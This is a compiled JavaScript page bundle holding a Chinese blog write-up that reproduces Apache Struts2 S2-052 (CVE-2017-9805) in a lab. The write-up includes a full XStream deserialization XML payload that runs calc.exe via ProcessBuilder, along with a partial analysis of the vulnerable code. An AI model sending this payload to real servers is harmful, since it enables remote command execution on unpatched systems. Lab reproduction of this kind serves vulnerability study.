import{_ as D}from"./ValaxyMain.vue_vue_type_style_index_0_lang-fe952921.js";import{_ as F,p as y,c as A,w as o,o as C,a as s,b as l,d as a,r as n,e as i}from"./app-a51598bf.js";import"./YunFooter.vue_vue_type_script_setup_true_lang-9cc900c2.js";import"./YunCard.vue_vue_type_script_setup_true_lang-fac3e250.js";import"./YunPageHeader.vue_vue_type_script_setup_true_lang-e8684ee8.js";const d="/images/pasted-307.png",u="/images/pasted-308.png",h="/images/pasted-309.png",m="/images/pasted-310.png",Cs=JSON.parse('{"title":"struts2[s2-052]远程命令执行漏洞复现","description":"","frontmatter":{"layout":"post","title":"struts2[s2-052]远程命令执行漏洞复现","tags":[],"categories":["漏洞复现"],"author":"1ss4k","date":"2021-03-31T14:12:00.000Z"},"headers":[{"level":2,"title":"漏洞信息","slug":"漏洞信息","link":"#漏洞信息","children":[]},{"level":2,"title":"环境搭建","slug":"环境搭建","link":"#环境搭建","children":[]},{"level":2,"title":"复现过程","slug":"复现过程","link":"#复现过程","children":[]},{"level":2,"title":"漏洞分析","slug":"漏洞分析","link":"#漏洞分析","children":[]}],"relativePath":"pages/posts/struts2[s2-052]rce.md","path":"/home/runner/work/1ss4kIT.github.io/1ss4kIT.github.io/pages/posts/struts2[s2-052]rce.md","lastUpdated":1690730773000}'),r=JSON.parse('{"title":"struts2[s2-052]远程命令执行漏洞复现","description":"","frontmatter":{"layout":"post","title":"struts2[s2-052]远程命令执行漏洞复现","tags":[],"categories":["漏洞复现"],"author":"1ss4k","date":"2021-03-31T14:12:00.000Z"},"headers":[{"level":2,"title":"漏洞信息","slug":"漏洞信息","link":"#漏洞信息","children":[]},{"level":2,"title":"环境搭建","slug":"环境搭建","link":"#环境搭建","children":[]},{"level":2,"title":"复现过程","slug":"复现过程","link":"#复现过程","children":[]},{"level":2,"title":"漏洞分析","slug":"漏洞分析","link":"#漏洞分析","children":[]}],"relativePath":"pages/posts/struts2[s2-052]rce.md","path":"/home/runner/work/1ss4kIT.github.io/1ss4kIT.github.io/pages/posts/struts2[s2-052]rce.md","lastUpdated":1690730773000}'),_={name:"pages/posts/struts2[s2-052]rce.md",data(){return{data:r,frontmatter:r.frontmatter,$frontmatter:r.frontmatter}},setup(){y("pageData",r)}},f={id:"漏洞信息",tabindex:"-1"},g=s("p",null,"编号：CVE-2017-9805",-1),E={id:"环境搭建",tabindex:"-1"},v=s("p",null,"1、Windows 10(64位)",-1),b=s("p",null,"2、tomcat9.0",-1),k=s("p",null,"参考",-1),S=s("p",null,"/bin目录下，开启：startup，关闭：shutdown",-1),j=s("p",null,"3、struts-2.5.12",-1),x=s("p",null,"4、bp",-1),w=s("p",null,[l("在C盘目录下，直接"),s("code",null,"运行.bat"),l("，使用Chrome浏览器，端口8088")],-1),$={id:"复现过程",tabindex:"-1"},N=s("p",null,"1、bp抓包",-1),I=s("p",null,[l("访问"),s("code",null,"ip:8080/struts2-rest-showcase/")],-1),B=s("p",null,[s("img",{src:d,alt:"upload successful"})],-1),T=s("p",null,"2、改包",-1),M=s("p",null,"Content-Type: application/x-www-form-urlencoded 表示使用URL编码的方式来编码表单，是浏览器默认的编码格式。当action为get时候，浏览器用x-www-form-urlencoded的编码方式把form数据转换成一个字串（name1=value1&name2=value2…），然后把这个字串append到url后面，用?分割，加载这个新的url。",-1),R=s("p",null,"post改为如下内容",-1),V=s("div",{class:"language-python"},[s("span",{class:"copy"}),s("pre",{class:"shiki material-theme-palenight"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{color:"#89DDFF"}},"<"),s("span",{style:{color:"#82AAFF"}},"map"),s("span",{style:{color:"#89DDFF"}},">")]),l(`
`),s("span",{class:"line"}),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#89DDFF"}},"<"),s("span",{style:{color:"#A6ACCD"}},"entry"),s("span",{style:{color:"#89DDFF"}},">")]),l(`
`),s("span",{class:"line"}),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#89DDFF"}},"<"),s("span",{style:{color:"#A6ACCD"}},"jdk"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#F07178"}},"nashorn"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#F07178"}},"internal"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#F07178"}},"objects"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#F07178"}},"NativeString"),s("span",{style:{color:"#89DDFF"}},">"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"<"),s("span",{style:{color:"#A6ACCD"}},"flags"),s("span",{style:{color:"#89DDFF"}},">"),s("span",{style:{color:"#F78C6C"}},"0"),s("span",{style:{color:"#89DDFF"}},"</"),s("span",{style:{color:"#A6ACCD"}},"flags"),s("span",{style:{color:"#89DDFF"}},">"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"<"),s("span",{style:{color:"#A6ACCD"}},"value "),s("span",{style:{color:"#C792EA"}},"class"),s("span",{style:{color:"#89DDFF"}},"="),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#C3E88D"}},"com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data"),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#89DDFF"}},">"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"<"),s("span",{style:{color:"#A6ACCD"}},"dataHandler"),s("span",{style:{color:"#89DDFF"}},">"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"<"),s("span",{style:{color:"#A6ACCD"}},"dataSource "),s("span",{style:{color:"#C792EA"}},"class"),s("span",{style:{color:"#89DDFF"}},"="),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#C3E88D"}},"com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource"),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#89DDFF"}},">"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"<is"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#C792EA"}},"class"),s("span",{style:{color:"#89DDFF"}},"="),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#C3E88D"}},"javax.crypto.CipherInputStream"),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#89DDFF"}},">"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"<"),s("span",{style:{color:"#A6ACCD"}},"cipher "),s("span",{style:{color:"#C792EA"}},"class"),s("span",{style:{color:"#89DDFF"}},"="),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#C3E88D"}},"javax.crypto.NullCipher"),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#89DDFF"}},">"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"<"),s("span",{style:{color:"#A6ACCD"}},"initialized"),s("span",{style:{color:"#89DDFF"}},">"),s("span",{style:{color:"#A6ACCD"}},"false"),s("span",{style:{color:"#89DDFF"}},"</"),s("span",{style:{color:"#A6ACCD"}},"initialized"),s("span",{style:{color:"#89DDFF"}},">"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"<"),s("span",{style:{color:"#A6ACCD"}},"opmode"),s("span",{style:{color:"#89DDFF"}},">"),s("span",{style:{color:"#F78C6C"}},"0"),s("span",{style:{color:"#89DDFF"}},"</"),s("span",{style:{color:"#A6ACCD"}},"opmode"),s("span",{style:{color:"#89DDFF"}},">"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"<"),s("span",{style:{color:"#A6ACCD"}},"serviceIterator "),s("span",{style:{color:"#C792EA"}},"class"),s("span",{style:{color:"#89DDFF"}},"="),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#C3E88D"}},"javax.imageio.spi.FilterIterator"),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#89DDFF"}},">"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"<"),s("span",{style:{color:"#82AAFF"}},"iter"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#C792EA"}},"class"),s("span",{style:{color:"#89DDFF"}},"="),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#C3E88D"}},"javax.imageio.spi.FilterIterator"),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#89DDFF"}},">"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"<"),s("span",{style:{color:"#82AAFF"}},"iter"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#C792EA"}},"class"),s("span",{style:{color:"#89DDFF"}},"="),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#C3E88D"}},"java.util.Collections$EmptyIterator"),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#89DDFF"}},"/>"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"<"),s("span",{style:{color:"#82AAFF"}},"next"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#C792EA"}},"class"),s("span",{style:{color:"#89DDFF"}},"="),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#C3E88D"}},"java.lang.ProcessBuilder"),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#89DDFF"}},">"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"<"),s("span",{style:{color:"#A6ACCD"}},"command"),s("span",{style:{color:"#89DDFF"}},">"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"<"),s("span",{style:{color:"#A6ACCD"}},"string"),s("span",{style:{color:"#89DDFF"}},">"),s("span",{style:{color:"#A6ACCD"}},"calc"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#F07178"}},"exe"),s("span",{style:{color:"#89DDFF"}},"</"),s("span",{style:{color:"#A6ACCD"}},"string"),s("span",{style:{color:"#89DDFF"}},">"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"</"),s("span",{style:{color:"#A6ACCD"}},"command"),s("span",{style:{color:"#89DDFF"}},">"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"<"),s("span",{style:{color:"#A6ACCD"}},"redirectErrorStream"),s("span",{style:{color:"#89DDFF"}},">"),s("span",{style:{color:"#A6ACCD"}},"false"),s("span",{style:{color:"#89DDFF"}},"</"),s("span",{style:{color:"#A6ACCD"}},"redirectErrorStream"),s("span",{style:{color:"#89DDFF"}},">"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"</"),s("span",{style:{color:"#82AAFF"}},"next"),s("span",{style:{color:"#89DDFF"}},">"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"</"),s("span",{style:{color:"#82AAFF"}},"iter"),s("span",{style:{color:"#89DDFF"}},">"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"<"),s("span",{style:{color:"#82AAFF"}},"filter"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#C792EA"}},"class"),s("span",{style:{color:"#89DDFF"}},"="),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#C3E88D"}},"javax.imageio.ImageIO$ContainsFilter"),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#89DDFF"}},">"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"<"),s("span",{style:{color:"#A6ACCD"}},"method"),s("span",{style:{color:"#89DDFF"}},">"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"<"),s("span",{style:{color:"#C792EA"}},"class"),s("span",{style:{color:"#89DDFF"}},">"),s("span",{style:{color:"#A6ACCD"}},"java"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#F07178"}},"lang"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#F07178"}},"ProcessBuilder"),s("span",{style:{color:"#89DDFF"}},"</"),s("span",{style:{color:"#C792EA"}},"class"),s("span",{style:{color:"#89DDFF"}},">"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"<"),s("span",{style:{color:"#A6ACCD"}},"name"),s("span",{style:{color:"#89DDFF"}},">"),s("span",{style:{color:"#A6ACCD"}},"start"),s("span",{style:{color:"#89DDFF"}},"</"),s("span",{style:{color:"#A6ACCD"}},"name"),s("span",{style:{color:"#89DDFF"}},">"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"<"),s("span",{style:{color:"#A6ACCD"}},"parameter"),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#A6ACCD"}},"types"),s("span",{style:{color:"#89DDFF"}},"/>"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"</"),s("span",{style:{color:"#A6ACCD"}},"method"),s("span",{style:{color:"#89DDFF"}},">"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"<"),s("span",{style:{color:"#A6ACCD"}},"name"),s("span",{style:{color:"#89DDFF"}},">"),s("span",{style:{color:"#A6ACCD"}},"foo"),s("span",{style:{color:"#89DDFF"}},"</"),s("span",{style:{color:"#A6ACCD"}},"name"),s("span",{style:{color:"#89DDFF"}},">"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"</"),s("span",{style:{color:"#82AAFF"}},"filter"),s("span",{style:{color:"#89DDFF"}},">"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"<"),s("span",{style:{color:"#82AAFF"}},"next"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#C792EA"}},"class"),s("span",{style:{color:"#89DDFF"}},"="),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#C3E88D"}},"string"),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#89DDFF"}},">"),s("span",{style:{color:"#A6ACCD"}},"foo"),s("span",{style:{color:"#89DDFF"}},"</"),s("span",{style:{color:"#82AAFF"}},"next"),s("span",{style:{color:"#89DDFF"}},">"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"</"),s("span",{style:{color:"#A6ACCD"}},"serviceIterator"),s("span",{style:{color:"#89DDFF"}},">"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"<"),s("span",{style:{color:"#A6ACCD"}},"lock"),s("span",{style:{color:"#89DDFF"}},"/>"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"</"),s("span",{style:{color:"#A6ACCD"}},"cipher"),s("span",{style:{color:"#89DDFF"}},">"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"<"),s("span",{style:{color:"#82AAFF"}},"input"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#C792EA"}},"class"),s("span",{style:{color:"#89DDFF"}},"="),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#C3E88D"}},"java.lang.ProcessBuilder$NullInputStream"),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#89DDFF"}},"/>"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"<"),s("span",{style:{color:"#A6ACCD"}},"ibuffer"),s("span",{style:{color:"#89DDFF"}},"></"),s("span",{style:{color:"#A6ACCD"}},"ibuffer"),s("span",{style:{color:"#89DDFF"}},">"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"<"),s("span",{style:{color:"#A6ACCD"}},"done"),s("span",{style:{color:"#89DDFF"}},">"),s("span",{style:{color:"#A6ACCD"}},"false"),s("span",{style:{color:"#89DDFF"}},"</"),s("span",{style:{color:"#A6ACCD"}},"done"),s("span",{style:{color:"#89DDFF"}},">"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"<"),s("span",{style:{color:"#A6ACCD"}},"ostart"),s("span",{style:{color:"#89DDFF"}},">"),s("span",{style:{color:"#F78C6C"}},"0"),s("span",{style:{color:"#89DDFF"}},"</"),s("span",{style:{color:"#A6ACCD"}},"ostart"),s("span",{style:{color:"#89DDFF"}},">"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"<"),s("span",{style:{color:"#A6ACCD"}},"ofinish"),s("span",{style:{color:"#89DDFF"}},">"),s("span",{style:{color:"#F78C6C"}},"0"),s("span",{style:{color:"#89DDFF"}},"</"),s("span",{style:{color:"#A6ACCD"}},"ofinish"),s("span",{style:{color:"#89DDFF"}},">"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"<"),s("span",{style:{color:"#A6ACCD"}},"closed"),s("span",{style:{color:"#89DDFF"}},">"),s("span",{style:{color:"#A6ACCD"}},"false"),s("span",{style:{color:"#89DDFF"}},"</"),s("span",{style:{color:"#A6ACCD"}},"closed"),s("span",{style:{color:"#89DDFF"}},">"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"</is>"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"<"),s("span",{style:{color:"#A6ACCD"}},"consumed"),s("span",{style:{color:"#89DDFF"}},">"),s("span",{style:{color:"#A6ACCD"}},"false"),s("span",{style:{color:"#89DDFF"}},"</"),s("span",{style:{color:"#A6ACCD"}},"consumed"),s("span",{style:{color:"#89DDFF"}},">"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"</"),s("span",{style:{color:"#A6ACCD"}},"dataSource"),s("span",{style:{color:"#89DDFF"}},">"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"<"),s("span",{style:{color:"#A6ACCD"}},"transferFlavors"),s("span",{style:{color:"#89DDFF"}},"/>"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"</"),s("span",{style:{color:"#A6ACCD"}},"dataHandler"),s("span",{style:{color:"#89DDFF"}},">"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"<"),s("span",{style:{color:"#A6ACCD"}},"dataLen"),s("span",{style:{color:"#89DDFF"}},">"),s("span",{style:{color:"#F78C6C"}},"0"),s("span",{style:{color:"#89DDFF"}},"</"),s("span",{style:{color:"#A6ACCD"}},"dataLen"),s("span",{style:{color:"#89DDFF"}},">"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"</"),s("span",{style:{color:"#A6ACCD"}},"value"),s("span",{style:{color:"#89DDFF"}},">"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"</"),s("span",{style:{color:"#A6ACCD"}},"jdk"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#F07178"}},"nashorn"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#F07178"}},"internal"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#F07178"}},"objects"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#F07178"}},"NativeString"),s("span",{style:{color:"#89DDFF"}},">"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"<"),s("span",{style:{color:"#A6ACCD"}},"jdk"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#F07178"}},"nashorn"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#F07178"}},"internal"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#F07178"}},"objects"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#F07178"}},"NativeString"),s("span",{style:{color:"#A6ACCD"}}," reference"),s("span",{style:{color:"#89DDFF"}},"="),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#C3E88D"}},"../jdk.nashorn.internal.objects.NativeString"),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#89DDFF"}},"/>"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"</"),s("span",{style:{color:"#A6ACCD"}},"entry"),s("span",{style:{color:"#89DDFF"}},">"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"<"),s("span",{style:{color:"#A6ACCD"}},"entry"),s("span",{style:{color:"#89DDFF"}},">"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"<"),s("span",{style:{color:"#A6ACCD"}},"jdk"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#F07178"}},"nashorn"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#F07178"}},"internal"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#F07178"}},"objects"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#F07178"}},"NativeString"),s("span",{style:{color:"#A6ACCD"}}," reference"),s("span",{style:{color:"#89DDFF"}},"="),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#C3E88D"}},"../../entry/jdk.nashorn.internal.objects.NativeString"),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#89DDFF"}},"/>"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"<"),s("span",{style:{color:"#A6ACCD"}},"jdk"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#F07178"}},"nashorn"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#F07178"}},"internal"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#F07178"}},"objects"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#F07178"}},"NativeString"),s("span",{style:{color:"#A6ACCD"}}," reference"),s("span",{style:{color:"#89DDFF"}},"="),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#C3E88D"}},"../../entry/jdk.nashorn.internal.objects.NativeString"),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#89DDFF"}},"/>")]),l(`
`),s("span",{class:"line"}),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#89DDFF"}},"</"),s("span",{style:{color:"#A6ACCD"}},"entry"),s("span",{style:{color:"#89DDFF"}},">")]),l(`
`),s("span",{class:"line"}),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#89DDFF"}},"</"),s("span",{style:{color:"#82AAFF"}},"map"),s("span",{style:{color:"#89DDFF"}},">")])])])],-1),X=s("p",null,"发送，弹出计算器～",-1),H=s("p",null,[s("img",{src:u,alt:"upload successful"})],-1),P={id:"漏洞分析",tabindex:"-1"},q=s("p",null,"参考现有文章，请求会被传给下面的函数👇",-1),L=s("p",null,[s("img",{src:h,alt:"upload successful"})],-1),z=s("p",null,"其中含有语句",-1),O=s("div",{class:"language-java"},[s("span",{class:"copy"}),s("pre",{class:"shiki material-theme-palenight"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{color:"#C792EA"}},"HttpServletRequest"),s("span",{style:{color:"#A6ACCD"}}," request "),s("span",{style:{color:"#89DDFF"}},"="),s("span",{style:{color:"#A6ACCD"}}," ServletActionContext"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#82AAFF"}},"getRequest"),s("span",{style:{color:"#89DDFF"}},"();")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"        "),s("span",{style:{color:"#C792EA"}},"ContentTypeHandler"),s("span",{style:{color:"#A6ACCD"}}," handler "),s("span",{style:{color:"#89DDFF"}},"="),s("span",{style:{color:"#A6ACCD"}}," selector"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#82AAFF"}},"getHandlerForRequest"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#A6ACCD"}},"request"),s("span",{style:{color:"#89DDFF"}},");")])])])],-1),U=s("p",null,"getHandlerForRequest在此处是XStreamHandler，随后调用如下函数",-1),J=s("div",{class:"language-java"},[s("span",{class:"copy"}),s("pre",{class:"shiki material-theme-palenight"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{color:"#C792EA"}},"public"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#C792EA"}},"void"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#82AAFF"}},"toObject"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#C792EA"}},"Reader"),s("span",{style:{color:"#A6ACCD"}}," in"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#C792EA"}},"Object"),s("span",{style:{color:"#A6ACCD"}}," target"),s("span",{style:{color:"#89DDFF"}},")"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"{")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"        "),s("span",{style:{color:"#C792EA"}},"XStream"),s("span",{style:{color:"#A6ACCD"}}," xstream "),s("span",{style:{color:"#89DDFF"}},"="),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#82AAFF"}},"createXStream"),s("span",{style:{color:"#89DDFF"}},"();")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"        xstream"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#82AAFF"}},"fromXML"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#A6ACCD"}},"in"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#A6ACCD"}}," target"),s("span",{style:{color:"#89DDFF"}},");")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"    "),s("span",{style:{color:"#89DDFF"}},"}")])])])],-1),Z=s("p",null,"from XML 调用unmarshal，创建hashMap并且调用PopulateMap",-1),G=s("p",null,"PopulateMap调用PutCurrentEntryIntoMap，其再调用readItem，此时变量值如下",-1),W=s("p",null,[s("img",{src:m,alt:"upload successful"}),l(" 接着调用doUnmarshal，得到node name，搜索class name。")],-1),K=s("p",null,"...",-1),Q=s("p",null,"下面还有很复杂的过程，但是自己既不会java，也没弄好调试...所以看不懂",-1),Y=s("p",null,"大致的过程就是REST插件在解析请求中的xml文件时，调用了XStreamHandler，传入的数据会被默认进行反序列化，如果当传入的xml是个经过XStream序列化的恶意对象时，便造成反序列化漏洞。",-1),ss=s("p",null,"收获：",-1),ls=s("p",null,"1、如果想自己分析的话，需要远程调试。但是还没配置好",-1),os=s("p",null,"2、三五太难了😭",-1),es=s("p",null,"参考",-1);function ts(e,as,ns,rs,c,cs){const t=i,p=D;return C(),A(p,{frontmatter:c.frontmatter,data:c.data},{"main-content-md":o(()=>[s("h2",f,[l("漏洞信息 "),a(t,{class:"header-anchor",href:"#漏洞信息","aria-hidden":"true"},{default:o(()=>[l("#")]),_:1})]),g,s("h2",E,[l("环境搭建 "),a(t,{class:"header-anchor",href:"#环境搭建","aria-hidden":"true"},{default:o(()=>[l("#")]),_:1})]),v,b,k,s("p",null,[a(t,{href:"https://blog.csdn.net/weixin_44092289/article/details/88374898",target:"_blank",rel:"noreferrer"},{default:o(()=>[l("安装配置 by荆棘云海")]),_:1})]),s("p",null,[a(t,{href:"https://blog.csdn.net/wxb141001yxx/article/details/96976380",target:"_blank",rel:"noreferrer"},{default:o(()=>[l("startup错误解决 by Jessica-小波")]),_:1})]),S,j,s("p",null,[a(t,{href:"http://archive.apache.org/dist/struts/2.5.12/struts-2.5.12-apps.zip",target:"_blank",rel:"noreferrer"},{default:o(()=>[l("下载地址")]),_:1})]),s("p",null,[a(t,{href:"https://archive.apache.org/dist/struts/2.5.12/",target:"_blank",rel:"noreferrer"},{default:o(()=>[l("2.5.12源码下载地址")]),_:1})]),x,w,s("p",null,[a(t,{href:"https://blog.csdn.net/qiushisoftware/article/details/107784751",target:"_blank",rel:"noreferrer"},{default:o(()=>[l("配置教程")]),_:1})]),s("h2",$,[l("复现过程 "),a(t,{class:"header-anchor",href:"#复现过程","aria-hidden":"true"},{default:o(()=>[l("#")]),_:1})]),N,I,B,T,M,R,V,X,H,s("h2",P,[l("漏洞分析 "),a(t,{class:"header-anchor",href:"#漏洞分析","aria-hidden":"true"},{default:o(()=>[l("#")]),_:1})]),q,L,z,O,U,J,Z,G,W,K,Q,Y,ss,ls,os,es,s("p",null,[a(t,{href:"https://www.mcafee.com/blogs/other-blogs/mcafee-labs/apache-struts-at-rest-analyzing-remote-code-execution-vulnerability-cve-2017-9805/",target:"_blank",rel:"noreferrer"},{default:o(()=>[l("Apache Struts at REST: Analyzing Remote Code Execution Vulnerability CVE-2017-9805 by McAfee")]),_:1})]),s("p",null,[a(t,{href:"https://www.cnblogs.com/backlion/p/7490260.html",target:"_blank",rel:"noreferrer"},{default:o(()=>[l("struts2(s2-052)远程命令执行漏洞复现 by 